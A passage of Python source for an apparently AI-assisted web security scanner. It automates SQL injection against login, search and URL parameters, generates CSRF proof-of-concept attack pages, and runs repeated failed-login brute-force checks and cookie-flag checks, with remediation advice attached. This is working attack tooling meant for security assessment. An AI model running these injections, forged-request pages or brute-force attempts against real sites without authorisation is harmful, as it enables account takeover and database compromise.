                        success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'account', 'logged in']
                        is_bypassed = (current_url != url or 
                                     any(indicator in page_source for indicator in success_indicators))
                        
                        test_log['current_url'] = current_url
                        test_log['is_vulnerable'] = is_bypassed
                        test_log['success_indicators_found'] = [ind for ind in success_indicators if ind in page_source]
                        
                        if is_bypassed:
                            screenshot = self.main_tester.take_screenshot(scenario_id, 
                                f"Auth bypass in form {idx}")
                            test_log['screenshot'] = screenshot
                            test_log['status'] = 'VULNERABLE'
                            
                            ai_analysis = self.llm.analyze_vulnerability(test_log)
                            test_log['ai_analysis'] = ai_analysis
                            
                            vuln = {
                                'type': 'SQL Injection - Authentication Bypass',
                                'severity': 'CRITICAL',
                                'scenario_id': scenario_id,
                                'location': f"Login form #{idx}",
                                'exact_xpath': form_xpath,
                                'username_field_xpath': username_xpath,
                                'password_field_xpath': password_xpath,
                                'form_action': form_action,
                                'form_method': form_method,
                                'url': url,
                                'payload': payload,
                                'execution_time': execution_time,
                                'redirected_to': current_url,
                                'description': 'SQL Injection allows authentication bypass',
                                'proof_of_concept': f"Username: {payload}, Password: any",
                                'screenshot': screenshot,
                                'console_errors': test_log['console_errors'],
                                'success_indicators': test_log['success_indicators_found'],
                                'ai_analysis': ai_analysis,
                                'impact': 'Complete authentication bypass - attacker can login as any user without password',
                                'remediation': 'Use parameterized queries for authentication, implement prepared statements',
                                'test_details': test_log
                            }
                            vulnerabilities.append(vuln)
                            self.main_tester.vulnerabilities_found += 1
                            
                            print(f"        🚨 CRITICAL: Authentication Bypass!")
                        else:
                            test_log['status'] = 'SAFE'
                            print(f"        ✅ Safe")
                    
                    except Exception as e:
                        test_log['status'] = 'ERROR'
                        test_log['error'] = str(e)
                        print(f"        ❌ Error: {e}")
                    
                    self.main_tester.log_test_attempt(test_log)
        
        except Exception as e:
            print(f"    ❌ Error testing login forms: {e}")
        
        return vulnerabilities
    
    def test_search_forms_advanced(self, url: str) -> List[Dict]:
        """Advanced search form SQL injection testing"""
        vulnerabilities = []
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            search_inputs = self.driver.find_elements(By.CSS_SELECTOR, 
                'input[name*="search"], input[name*="query"], input[name*="q"], input[type="search"]')
            
            if not search_inputs:
                print("    ℹ️  No search forms found")
                return vulnerabilities
            
            for idx, search_input in enumerate(search_inputs, 1):
                print(f"\n    Testing search input #{idx}")
                
                search_xpath = self.main_tester.get_element_xpath(search_input)
                search_name = search_input.get_attribute('name')
                
                ai_scenarios = self.llm.generate_security_scenarios(
                    {'type': 'search_input', 'name': search_name}, 
                    "SQL_INJECTION"
                )
                all_scenarios = ai_scenarios + [
                    {"payload": p, "scenario_id": f"SQLI_SEARCH_{idx}_{i:03d}", "type": "SQL_INJECTION"}
                    for i, p in enumerate(self.static_payloads[:5], 1)
                ]
                
                for scenario in all_scenarios:
                    payload = scenario.get('payload')
                    scenario_id = scenario.get('scenario_id', 'UNKNOWN')
                    
                    test_log = {
                        'test_type': 'SQLI_SEARCH_FORM',
                        'scenario_id': scenario_id,
                        'target': url,
                        'search_input_index': idx,
                        'search_xpath': search_xpath,
                        'search_name': search_name,
                        'payload': payload,
                        'scenario_details': scenario
                    }
                    
                    try:
                        self.driver.get(url)
                        time.sleep(1)
                        
                        search_input = self.driver.find_elements(By.CSS_SELECTOR, 
                            'input[name*="search"], input[name*="query"], input[name*="q"], input[type="search"]')[idx-1]
                        
                        print(f"      [{self.main_tester.test_counter + 1:04d}] Testing: {scenario_id}")
                        
                        search_input.clear()
                        search_input.send_keys(payload)
                        
                        start_time = time.time()
                        search_input.submit()
                        time.sleep(2)
                        execution_time = time.time() - start_time
                        
                        test_log['execution_time'] = execution_time
                        test_log['console_errors'] = self.main_tester.get_console_errors()
                        
                        page_source = self.driver.page_source.lower()
                        is_vulnerable = self.check_sql_injection(payload, execution_time, page_source)
                        test_log['is_vulnerable'] = is_vulnerable
                        
                        if is_vulnerable:
                            screenshot = self.main_tester.take_screenshot(scenario_id, 
                                f"SQLi in search {idx}")
                            test_log['screenshot'] = screenshot
                            test_log['status'] = 'VULNERABLE'
                            
                            sql_error_type = self.detect_sql_error_type(page_source)
                            test_log['sql_error_type'] = sql_error_type
                            
                            ai_analysis = self.llm.analyze_vulnerability(test_log)
                            test_log['ai_analysis'] = ai_analysis
                            
                            vuln = {
                                'type': 'SQL Injection - Search Form',
                                'severity': 'CRITICAL',
                                'scenario_id': scenario_id,
                                'location': f"Search input #{idx}",
                                'exact_xpath': search_xpath,
                                'search_name': search_name,
                                'url': url,
                                'payload': payload,
                                'execution_time': execution_time,
                                'sql_error_type': sql_error_type,
                                'description': 'SQL Injection in search functionality',
                                'proof_of_concept': f"Search query: {payload}",
                                'screenshot': screenshot,
                                'console_errors': test_log['console_errors'],
                                'ai_analysis': ai_analysis,
                                'impact': 'Database compromise, data extraction',
                                'remediation': 'Sanitize search input and use parameterized queries',
                                'test_details': test_log
                            }
                            vulnerabilities.append(vuln)
                            self.main_tester.vulnerabilities_found += 1
                            
                            print(f"        🚨 VULNERABLE! Type: {sql_error_type}")
                        else:
                            test_log['status'] = 'SAFE'
                            print(f"        ✅ Safe")
                    
                    except Exception as e:
                        test_log['status'] = 'ERROR'
                        test_log['error'] = str(e)
                        print(f"        ❌ Error: {e}")
                    
                    self.main_tester.log_test_attempt(test_log)
        
        except Exception as e:
            print(f"    ❌ Error testing search forms: {e}")
        
        return vulnerabilities
    
    def test_error_based_advanced(self, url: str) -> List[Dict]:
        """Advanced error-based SQL injection testing"""
        vulnerabilities = []
        
        error_payloads = ["'", "\"", "';", "\";"]
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if params:
            for param_name in params.keys():
                for i, payload in enumerate(error_payloads, 1):
                    scenario_id = f"SQLI_ERROR_{param_name}_{i:03d}"
                    
                    test_log = {
                        'test_type': 'SQLI_ERROR_BASED',
                        'scenario_id': scenario_id,
                        'target': url,
                        'parameter': param_name,
                        'payload': payload
                    }
                    
                    try:
                        test_params = params.copy()
                        test_params[param_name] = [payload]
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                        
                        test_log['test_url'] = test_url
                        
                        print(f"      [{self.main_tester.test_counter + 1:04d}] Testing error-based: {param_name}")
                        
                        start_time = time.time()
                        self.driver.get(test_url)
                        execution_time = time.time() - start_time
                        time.sleep(1)
                        
                        test_log['execution_time'] = execution_time
                        test_log['console_errors'] = self.main_tester.get_console_errors()
                        
                        page_source = self.driver.page_source.lower()
                        
                        # Check for SQL error messages
                        sql_errors = [
                            'sql syntax', 'mysql', 'postgresql', 'ora-', 'sqlite',
                            'syntax error', 'unclosed quotation', 'quoted string',
                            'microsoft ole db', 'odbc', 'jdbc', 'sqlstate',
                            'you have an error in your sql', 'warning: mysql'
                        ]
                        
                        found_errors = [err for err in sql_errors if err in page_source]
                        is_vulnerable = len(found_errors) > 0
                        
                        test_log['is_vulnerable'] = is_vulnerable
                        test_log['found_sql_errors'] = found_errors
                        
                        if is_vulnerable:
                            screenshot = self.main_tester.take_screenshot(scenario_id, 
                                f"SQL error in {param_name}")
                            test_log['screenshot'] = screenshot
                            test_log['status'] = 'VULNERABLE'
                            
                            ai_analysis = self.llm.analyze_vulnerability(test_log)
                            test_log['ai_analysis'] = ai_analysis
                            
                            vuln = {
                                'type': 'SQL Injection - Error-based',
                                'severity': 'CRITICAL',
                                'scenario_id': scenario_id,
                                'location': f"Parameter: {param_name}",
                                'exact_xpath': f"URL: {test_url}",
                                'url': test_url,
                                'parameter_name': param_name,
                                'payload': payload,
                                'execution_time': execution_time,
                                'sql_errors_found': found_errors,
                                'description': 'SQL error messages exposed, indicating SQL Injection',
                                'proof_of_concept': test_url,
                                'screenshot': screenshot,
                                'console_errors': test_log['console_errors'],
                                'ai_analysis': ai_analysis,
                                'impact': 'Database structure disclosure, data extraction through error messages',
                                'remediation': 'Disable error messages in production, use parameterized queries, implement proper error handling',
                                'test_details': test_log
                            }
                            vulnerabilities.append(vuln)
                            self.main_tester.vulnerabilities_found += 1
                            
                            print(f"        🚨 SQL ERROR DETECTED! Errors: {len(found_errors)}")
                        else:
                            test_log['status'] = 'SAFE'
                            print(f"        ✅ Safe")
                    
                    except Exception as e:
                        test_log['status'] = 'ERROR'
                        test_log['error'] = str(e)
                        print(f"        ❌ Error: {e}")
                    
                    self.main_tester.log_test_attempt(test_log)
        
        return vulnerabilities
    
    def check_sql_injection(self, payload: str, load_time: float, page_source: str) -> bool:
        """Check for SQL Injection indicators"""
        # Check for SQL error messages
        sql_errors = [
            'sql syntax', 'mysql', 'postgresql', 'ora-', 'sqlite',
            'syntax error', 'unclosed quotation', 'quoted string',
            'you have an error in your sql', 'warning: mysql',
            'microsoft ole db', 'odbc', 'jdbc', 'sqlstate'
        ]
        
        if any(error in page_source for error in sql_errors):
            return True
        
        # Check for time-based SQL Injection
        if 'sleep' in payload.lower() and load_time > 4:
            return True
        
        if 'waitfor' in payload.lower() and load_time > 4:
            return True
        
        return False
    
    def detect_sql_error_type(self, page_source: str) -> str:
        """Detect the type of SQL error"""
        if 'mysql' in page_source:
            return 'MySQL'
        elif 'postgresql' in page_source or 'postgres' in page_source:
            return 'PostgreSQL'
        elif 'oracle' in page_source or 'ora-' in page_source:
            return 'Oracle'
        elif 'microsoft' in page_source or 'sql server' in page_source:
            return 'MS SQL Server'
        elif 'sqlite' in page_source:
            return 'SQLite'
        else:
            return 'Unknown Database'


class AdvancedCSRFTester:
    """Advanced CSRF Protection Testing with detailed logging"""
    
    def __init__(self, driver, llm: LLMManager, main_tester):
        self.driver = driver
        self.llm = llm
        self.main_tester = main_tester
        self.results = []
        self.csrf_indicators = [
            'csrf', 'token', '_token', 'authenticity_token',
            'csrf_token', 'csrftoken', '_csrf', 'xsrf',
            'nonce', 'state', 'anti_forgery'
        ]
    
    def test_url(self, url: str) -> List[Dict]:
        """Comprehensive CSRF protection testing"""
        print(f"\n{'='*80}")
        print(f"🛡️  ADVANCED CSRF PROTECTION TESTING: {url}")
        print(f"{'='*80}")
        
        vulnerabilities = []
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            forms = self.driver.find_elements(By.TAG_NAME, 'form')
            
            if not forms:
                print("  ℹ️  No forms found")
                return vulnerabilities
            
            print(f"  Found {len(forms)} form(s)")
            
            for idx, form in enumerate(forms, 1):
                print(f"\n  📍 Testing form #{idx}")
                
                form_action = form.get_attribute('action') or url
                form_method = (form.get_attribute('method') or 'GET').upper()
                form_xpath = self.main_tester.get_element_xpath(form)
                form_id = form.get_attribute('id') or f'form_{idx}'
                
                scenario_id = f"CSRF_FORM_{idx:03d}"
                
                test_log = {
                    'test_type': 'CSRF_PROTECTION',
                    'scenario_id': scenario_id,
                    'target': url,
                    'form_index': idx,
                    'form_id': form_id,
                    'form_action': form_action,
                    'form_method': form_method,
                    'form_xpath': form_xpath
                }
                
                print(f"    Method: {form_method}")
                print(f"    Action: {form_action}")
                print(f"    XPath: {form_xpath}")
                
                # Check for CSRF token
                has_csrf_token, token_details = self.check_csrf_token_detailed(form)
                
                test_log['has_csrf_token'] = has_csrf_token
                test_log['token_details'] = token_details
                
                # Only POST/PUT/DELETE methods need CSRF protection
                needs_csrf = form_method in ['POST', 'PUT', 'DELETE', 'PATCH']
                test_log['needs_csrf_protection'] = needs_csrf
                
                is_vulnerable = needs_csrf and not has_csrf_token
                test_log['is_vulnerable'] = is_vulnerable
                
                if is_vulnerable:
                    screenshot = self.main_tester.take_screenshot(scenario_id, f"Missing CSRF in form {idx}")
                    test_log['screenshot'] = screenshot
                    test_log['status'] = 'VULNERABLE'
                    
                    # Generate CSRF PoC
                    poc_html = self.generate_csrf_poc_detailed(form, url, idx)
                    test_log['proof_of_concept_html'] = poc_html
                    
                    # Save PoC to file
                    poc_filename = f"csrf_poc_{scenario_id}.html"
                    with open(poc_filename, 'w') as f:
                        f.write(poc_html)
                    test_log['poc_file'] = poc_filename
                    
                    ai_analysis = self.llm.analyze_vulnerability(test_log)
                    test_log['ai_analysis'] = ai_analysis
                    
                    # Get all form inputs for detailed reporting
                    all_inputs = form.find_elements(By.TAG_NAME, 'input')
                    input_details = []
                    for inp in all_inputs:
                        input_details.append({
                            'type': inp.get_attribute('type'),
                            'name': inp.get_attribute('name'),
                            'id': inp.get_attribute('id'),
                            'value': inp.get_attribute('value'),
                            'xpath': self.main_tester.get_element_xpath(inp)
                        })
                    test_log['form_inputs'] = input_details
                    
                    vuln = {
                        'type': 'Missing CSRF Protection',
                        'severity': 'MEDIUM',
                        'scenario_id': scenario_id,
                        'location': f"Form #{idx}",
                        'exact_xpath': form_xpath,
                        'form_id': form_id,
                        'form_action': form_action,
                        'form_method': form_method,
                        'url': url,
                        'description': f'{form_method} form without CSRF token protection',
                        'proof_of_concept': poc_html,
                        'poc_file': poc_filename,
                        'screenshot': screenshot,
                        'form_inputs': input_details,
                        'token_checked_fields': len(token_details.get('checked_fields', [])),
                        'ai_analysis': ai_analysis,
                        'impact': 'Attacker can forge requests on behalf of authenticated users',
                        'remediation': 'Implement CSRF tokens for all state-changing operations (POST/PUT/DELETE)',
                        'test_details': test_log
                    }
                    vulnerabilities.append(vuln)
                    self.main_tester.vulnerabilities_found += 1
                    
                    print(f"    🚨 VULNERABLE: No CSRF token!")
                    print(f"    📄 PoC saved: {poc_filename}")
                else:
                    test_log['status'] = 'SAFE'
                    if has_csrf_token:
                        print(f"    ✅ CSRF token present: {token_details.get('token_name')}")
                    elif not needs_csrf:
                        print(f"    ℹ️  GET method - CSRF protection not required")
                
                self.main_tester.log_test_attempt(test_log)
        
        except Exception as e:
            print(f"  ❌ Error during CSRF testing: {e}")
        
        if vulnerabilities:
            print(f"\n  🚨 Found {len(vulnerabilities)} CSRF vulnerabilities!")
        else:
            print(f"\n  ✅ All forms have proper CSRF protection")
        
        self.results = vulnerabilities
        return vulnerabilities
    
    def check_csrf_token_detailed(self, form) -> tuple:
        """Detailed CSRF token check"""
        try:
            hidden_inputs = form.find_elements(By.CSS_SELECTOR, 'input[type="hidden"]')
            
            checked_fields = []
            
            for inp in hidden_inputs:
                name = inp.get_attribute('name') or ''
                value = inp.get_attribute('value') or ''
                name_lower = name.lower()
                
                checked_fields.append({
                    'name': name,
                    'value_length': len(value),
                    'xpath': self.main_tester.get_element_xpath(inp)
                })
                
                # Check if any CSRF indicator is in the name
                for indicator in self.csrf_indicators:
                    if indicator in name_lower:
                        return True, {
                            'found': True,
                            'token_name': name,
                            'token_value_length': len(value),
                            'token_xpath': self.main_tester.get_element_xpath(inp),
                            'indicator_matched': indicator,
                            'checked_fields': checked_fields
                        }
            
            return False, {
                'found': False,
                'checked_fields': checked_fields,
                'total_hidden_fields': len(hidden_inputs)
            }
        
        except Exception as e:
            return False, {'error': str(e)}
    
    def generate_csrf_poc_detailed(self, form, url: str, form_index: int) -> str:
        """Generate detailed CSRF proof-of-concept HTML"""
        try:
            action = form.get_attribute('action') or url
            method = form.get_attribute('method') or 'POST'
            
            if not action.startswith('http'):
                parsed_url = urlparse(url)
                if action.startswith('/'):
                    action = f"{parsed_url.scheme}://{parsed_url.netloc}{action}"
                else:
                    action = urljoin(url, action)
            
            inputs = form.find_elements(By.TAG_NAME, 'input')
            
            poc = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Proof of Concept - Form #{form_index}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background: #f5f5f5;
        }}
        .warning {{
            background: #fff3cd;
            border: 2px solid #ffc107;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
        }}
        .form-container {{
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        input, button {{
            margin: 10px 0;
            padding: 8px;
            width: 100%;
            box-sizing: border-box;
        }}
        button {{
            background: #dc3545;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }}
        button:hover {{
            background: #c82333;
        }}
        .info {{
            background: #d1ecf1;
            border: 2px solid #0c5460;
            padding: 15px;
            margin-top: 20px;
            border-radius: 5px;
        }}
    </style>
</head>
<body>
    <div class="warning">
        <h2>⚠️  CSRF Vulnerability Proof of Concept</h2>
        <p><strong>Target:</strong> {url}</p>
        <p><strong>Form:</strong> #{form_index}</p>
        <p><strong>Action:</strong> {action}</p>
        <p><strong>Method:</strong> {method}</p>
        <p><strong>Vulnerability:</strong> This form lacks CSRF protection</p>
    </div>
    
    <div class="form-container">
        <h3>Malicious Form (Identical to Target)</h3>
        <form action="{action}" method="{method}" id="csrf_form">
'''
            
            for inp in inputs:
                input_type = inp.get_attribute('type') or 'text'
                input_name = inp.get_attribute('name') or ''
                input_value = inp.get_attribute('value') or ''
                
                if input_type == 'submit':
                    continue
                
                poc += f'            <input type="{input_type}" name="{input_name}" value="{input_value}" placeholder="{input_name}" />\n'
            
            poc += '''            <button type="submit">Submit (Demonstrates CSRF Attack)</button>
        </form>
    </div>
    
    <div class="info">
        <h3>How This Attack Works:</h3>
        <ol>
            <li>Attacker hosts this HTML page on their server</li>
            <li>Victim (who is logged into target site) visits attacker's page</li>
            <li>Form auto-submits OR victim clicks submit button</li>
            <li>Request is sent to target site with victim's cookies</li>
            <li>Target site processes request as if victim initiated it</li>
            <li>Attacker successfully performs action on victim's behalf</li>
        </ol>
        
        <h3>Remediation:</h3>
        <ul>
            <li>Add CSRF token to all POST/PUT/DELETE forms</li>
            <li>Verify token on server side before processing request</li>
            <li>Use SameSite cookie attribute</li>
            <li>Implement additional checks (Referer header, custom headers)</li>
        </ul>
    </div>
    
    <script>
        // Auto-submit for demonstration (comment out in practice)
        // document.getElementById('csrf_form').submit();
    </script>
</body>
</html>'''
            
            return poc
        
        except Exception as e:
            return f"<!-- Error generating PoC: {e} -->"


class AdvancedAuthenticationTester:
    """Advanced Authentication & Authorization Testing with detailed logging"""
    
    def __init__(self, driver, llm: LLMManager, main_tester):
        self.driver = driver
        self.llm = llm
        self.main_tester = main_tester
        self.results = []
    
    def test_url(self, url: str) -> List[Dict]:
        """Comprehensive authentication testing"""
        print(f"\n{'='*80}")
        print(f"🔐 ADVANCED AUTHENTICATION TESTING: {url}")
        print(f"{'='*80}")
        
        vulnerabilities = []
        
        try:
            # 1. Test password policy
            print("\n  📍 Testing password policy...")
            password_vulns = self.test_password_policy_advanced(url)
            vulnerabilities.extend(password_vulns)
            
            # 2. Test brute force protection
            print("\n  📍 Testing brute force protection...")
            bruteforce_vulns = self.test_brute_force_protection_advanced(url)
            vulnerabilities.extend(bruteforce_vulns)
            
            # 3. Test session management
            print("\n  📍 Testing session management...")
            session_vulns = self.test_session_management_advanced(url)
            vulnerabilities.extend(session_vulns)
            
            # 4. Test default credentials
            print("\n  📍 Testing for default credentials...")
            default_vulns = self.test_default_credentials_advanced(url)
            vulnerabilities.extend(default_vulns)
            
        except Exception as e:
            print(f"  ❌ Error during authentication testing: {e}")
        
        if vulnerabilities:
            print(f"\n  🚨 Found {len(vulnerabilities)} authentication issues!")
        else:
            print(f"\n  ✅ No major authentication issues found")
        
        self.results = vulnerabilities
        return vulnerabilities
    
    def test_password_policy_advanced(self, url: str) -> List[Dict]:
        """Advanced password policy testing"""
        vulnerabilities = []
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            password_fields = self.driver.find_elements(By.CSS_SELECTOR, 'input[type="password"]')
            
            if not password_fields:
                print("    ℹ️  No password fields found")
                return vulnerabilities
            
            print(f"    Found {len(password_fields)} password field(s)")
            
            weak_passwords = [
                ('123', 'Very short password'),
                ('123456', 'Common weak password'),
                ('password', 'Dictionary word'),
                ('admin', 'Common admin password'),
                ('test', 'Test password'),
                ('qwerty', 'Keyboard pattern')
            ]
            
            for idx, password_field in enumerate(password_fields, 1):
                password_xpath = self.main_tester.get_element_xpath(password_field)
                password_name = password_field.get_attribute('name')
                
                for weak_pass, description in weak_passwords:
                    scenario_id = f"AUTH_WEAK_PASS_{idx}_{weak_passwords.index((weak_pass, description))+1:03d}"
                    
                    test_log = {
                        'test_type': 'AUTH_WEAK_PASSWORD',
                        'scenario_id': scenario_id,
                        'target': url,
                        'password_field_index': idx,
                        'password_xpath': password_xpath,
                        'password_name': password_name,
                        'weak_password': weak_pass,
                        'weakness_description': description
                    }
                    
                    try:
                        print(f"      [{self.main_tester.test_counter + 1:04d}] Testing weak password: {weak_pass}")
                        
                        password_field = self.driver.find_elements(By.CSS_SELECTOR, 'input[type="password"]')[idx-1]
                        
                        password_field.clear()
                        password_field.send_keys(weak_pass)
                        time.sleep(0.5)
                        
                        page_source = self.driver.page_source.lower()
                        
                        # Check for password strength validation
                        strength_indicators = [
                            'weak', 'strong', 'minimum', 'length', 'character',
                            'uppercase', 'lowercase', 'number', 'special', 'digit'
                        ]
                        
                        has_validation = any(indicator in page_source for indicator in strength_indicators)
                        found_indicators = [ind for ind in strength_indicators if ind in page_source]
                        
                        test_log['has_password_validation'] = has_validation
                        test_log['found_indicators'] = found_indicators
                        test_log['is_vulnerable'] = not has_validation
                        
                        if not has_validation:
                            screenshot = self.main_tester.take_screenshot(scenario_id, 
                                f"Weak password accepted: {weak_pass}")
                            test_log['screenshot'] = screenshot
                            test_log['status'] = 'VULNERABLE'
                            
                            ai_analysis = self.llm.analyze_vulnerability(test_log)
                            test_log['ai_analysis'] = ai_analysis
                            
                            vuln = {
                                'type': 'Weak Password Policy',
                                'severity': 'MEDIUM',
                                'scenario_id': scenario_id,
                                'location': f'Password field #{idx}',
                                'exact_xpath': password_xpath,
                                'password_field_name': password_name,
                                'url': url,
                                'weak_password': weak_pass,
                                'weakness_type': description,
                                'description': f'System accepts weak password: {weak_pass}',
                                'proof_of_concept': f'Password "{weak_pass}" was accepted without validation',
                                'screenshot': screenshot,
                                'ai_analysis': ai_analysis,
                                'impact': 'Users can set easily guessable passwords, facilitating brute force attacks',
                                'remediation': '''Enforce strong password policy:
- Minimum 8 characters
- At least one uppercase letter
- At least one lowercase letter  
- At least one number
- At least one special character
- Reject common passwords (dictionary check)''',
                                'test_details': test_log
                            }
                            vulnerabilities.append(vuln)
                            self.main_tester.vulnerabilities_found += 1
                            
                            print(f"        🚨 VULNERABLE: Weak password accepted!")
                            break  # Found vulnerability, no need to test more weak passwords for this field
                        else:
                            test_log['status'] = 'SAFE'
                            print(f"        ✅ Validation present")
                        
                        self.driver.get(url)
                        time.sleep(1)
                    
                    except Exception as e:
                        test_log['status'] = 'ERROR'
                        test_log['error'] = str(e)
                        print(f"        ❌ Error: {e}")
                    
                    self.main_tester.log_test_attempt(test_log)
        
        except Exception as e:
            print(f"    ❌ Error testing password policy: {e}")
        
        return vulnerabilities
    
    def test_brute_force_protection_advanced(self, url: str) -> List[Dict]:
        """Advanced brute force protection testing"""
        vulnerabilities = []
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            try:
                username_field = self.driver.find_element(By.CSS_SELECTOR, 
                    'input[name*="user"], input[name*="email"], input[type="email"]')
                password_field = self.driver.find_element(By.CSS_SELECTOR, 
                    'input[type="password"]')
            except:
                print("    ℹ️  No login form found")
                return vulnerabilities
            
            username_xpath = self.main_tester.get_element_xpath(username_field)
            password_xpath = self.main_tester.get_element_xpath(password_field)
            
            scenario_id = "AUTH_BRUTE_FORCE_001"
            
            test_log = {
                'test_type': 'AUTH_BRUTE_FORCE',
                'scenario_id': scenario_id,
                'target': url,
                'username_xpath': username_xpath,
                'password_xpath': password_xpath,
                'attempts': []
            }
            
            print(f"    Attempting multiple failed logins...")
            
            failed_attempts = 0
            blocked = False
            block_detected_at = None
            
            for i in range(1, 7):  # Try 6 attempts
                attempt_log = {
                    'attempt_number': i,
                    'username': f'testuser{i}@test.com',
                    'password': f'wrongpassword{i}'
                }
                
                try:
                    self.driver.get(url)
                    time.sleep(0.5)
                    
                    username_field = self.driver.find_element(By.CSS_SELECTOR, 
                        'input[name*="user"], input[name*="email"], input[type="email"]')
                    password_field = self.driver.find_element(By.CSS_SELECTOR, 
                        'input[type="password"]')
                    
                    username_field.clear()
                    username_field.send_keys(attempt_log['username'])
                    password_field.clear()
                    password_field.send_keys(attempt_log['password'])
                    
                    start_time = time.time()
                    password_field.submit()
                    time.sleep(1)
                    execution_time = time.time() - start_time
                    
                    attempt_log['execution_time'] = execution_time
                    failed_attempts += 1
                    
                    page_source = self.driver.page_source.lower()
                    
                    # Check if blocked
                    block_indicators = [
                        'locked', 'blocked', 'too many', 'rate limit',
                        'captcha', 'suspicious', 'temporarily disabled',
                        'wait', 'try again later'
                    ]
                    
                    found_blocks = [ind for ind in block_indicators if ind in page_source]
                    
                    if found_blocks:
                        blocked = True
                        block_detected_at = i
                        attempt_log['blocked'] = True
                        attempt_log['block_indicators'] = found_blocks
                        print(f"      ✅ Account locked after {failed_attempts} attempts")
                        print(f"         Indicators: {', '.join(found_blocks)}")
                        break
                    else:
                        attempt_log['blocked'] = False
                        print(f"      [{i}/6] Attempt {i} - No blocking detected")
                    
                    test_log['attempts'].append(attempt_log)
                
                except Exception as e:
                    attempt_log['error'] = str(e)
                    test_log['attempts'].append(attempt_log)
                    continue
            
            test_log['total_attempts'] = failed_attempts
            test_log['blocked'] = blocked
            test_log['block_detected_at'] = block_detected_at
            test_log['is_vulnerable'] = not blocked and failed_attempts >= 6
            
            if test_log['is_vulnerable']:
                screenshot = self.main_tester.take_screenshot(scenario_id, 
                    "No brute force protection")
                test_log['screenshot'] = screenshot
                test_log['status'] = 'VULNERABLE'
                
                ai_analysis = self.llm.analyze_vulnerability(test_log)
                test_log['ai_analysis'] = ai_analysis
                
                vuln = {
                    'type': 'No Brute Force Protection',
                    'severity': 'MEDIUM',
                    'scenario_id': scenario_id,
                    'location': 'Login form',
                    'username_xpath': username_xpath,
                    'password_xpath': password_xpath,
                    'url': url,
                    'failed_attempts': failed_attempts,
                    'description': 'No rate limiting or account lockout after multiple failed login attempts',
                    'proof_of_concept': f'{failed_attempts} failed login attempts without blocking',
                    'screenshot': screenshot,
                    'attempts_log': test_log['attempts'],
                    'ai_analysis': ai_analysis,
                    'impact': 'Attacker can perform brute force or credential stuffing attacks',
                    'remediation': '''Implement multiple protection layers:
- Rate limiting (max 5 attempts per 15 minutes)
- Account lockout after failed attempts
- Progressive delays (exponential backoff)
- CAPTCHA after 3 failed attempts
- Email notification on suspicious activity
- IP-based rate limiting''',
                    'test_details': test_log
                }
                vulnerabilities.append(vuln)
                self.main_tester.vulnerabilities_found += 1
                
                print(f"    🚨 VULNERABLE: No brute force protection!")
            else:
                test_log['status'] = 'SAFE'
                print(f"    ✅ Brute force protection active")
            
            self.main_tester.log_test_attempt(test_log)
        
        except Exception as e:
            print(f"    ❌ Error testing brute force protection: {e}")
        
        return vulnerabilities
    
    def test_session_management_advanced(self, url: str) -> List[Dict]:
        """Advanced session management testing"""
        vulnerabilities = []
        
        try:
            self.driver.get(url)
            time.sleep(2)
            
            cookies = self.driver.get_cookies()
            
            if not cookies:
                print("    ℹ️  No cookies found")
                return vulnerabilities
            
            print(f"    Found {len(cookies)} cookie(s)")
            
            for cookie in cookies:
                cookie_name = cookie.get('name', '')
                
                # Check if session cookie
                if any(word in cookie_name.lower() for word in ['session', 'sess', 'token', 'auth', 'sid']):
                    print(f"\n    Analyzing session cookie: {cookie_name}")
                    
                    cookie_domain = cookie.get('domain', '')
                    cookie_path = cookie.get('path', '')
                    cookie_secure = cookie.get('secure', False)
                    cookie_httponly = cookie.get('httpOnly', False)
                    cookie_samesite = cookie.get('sameSite', None)
                    cookie_value_length = len(cookie.get('value', ''))
                    
                    # Test 1: Missing Secure flag
                    if not cookie_secure:
                        scenario_id = f"AUTH_SESSION_SECURE_{cookies.index(cookie)+1:03d}"
                        
                        test_log = {
                            'test_type': 'AUTH_SESSION_INSECURE',
                            'scenario_id': scenario_id,
                            'target': url,
                            'cookie_name': cookie_name,
                            'cookie_domain': cookie_domain,
                            'cookie_path': cookie_path,
                            'cookie_secure': cookie_secure,
                            'cookie_httponly': cookie_httponly,
                            'cookie_samesite': cookie_samesite,
                            'cookie_value_length': cookie_value_length,
                            'is_vulnerable': True,
                            'vulnerability_type': 'Missing Secure flag'
                        }
                        
                        screenshot = self.main_tester.take_screenshot(scenario_id, 
                            f"Insecure cookie: {cookie_name}")
                        test_log['screenshot'] = screenshot
                        test_log['status'] = 'VULNERABLE'
                        
                        ai_analysis = self.llm.analyze_vulnerability(test_log)
                        test_log['ai_analysis'] = ai_analysis
                        
                        vuln = {
                            'type': 'Insecure Session Cookie',
                            'severity': 'MEDIUM',
                            'scenario_id': scenario_id,
                            'location': f'Cookie: {cookie_name}',
                            'url': url,
                            'cookie_name': cookie_name,
                            'cookie_details': {
                                'domain': cookie_domain,
                                'path': cookie_path,
                                'secure': cookie_secure,
                                'httpOnly': cookie_httponly,
                                'sameSite': cookie_samesite,
                                'value_length': cookie_value_length
                            },
                            'description': f'Session cookie "{cookie_name}" missing Secure flag',
                            'proof_of_concept': 'Cookie can be transmitted over HTTP (insecure)',
                            'screenshot': screenshot,
                            'ai_analysis': ai_analysis,
                            'impact': 'Session tokens can be intercepted over insecure HTTP connections (Man-in-the-Middle attack)',
                            'remediation': 'Set Secure flag on all session cookies to ensure transmission only over HTTPS',
                            'test_details': test_log
                        }
                        vulnerabilities.append(vuln)
                        self.main_tester.vulnerabilities_found += 1
                        
                        print(f"      🚨 Missing Secure flag")
                        
                        self.main_tester.log_test_attempt(test_log)
                    
                    # Test 2: Missing HttpOnly flag
                    if not cookie_httponly:
                        scenario_id = f"AUTH_SESSION_HTTPONLY_{cookies.index(cookie)+1:03d}"
                        
                        test_log = {
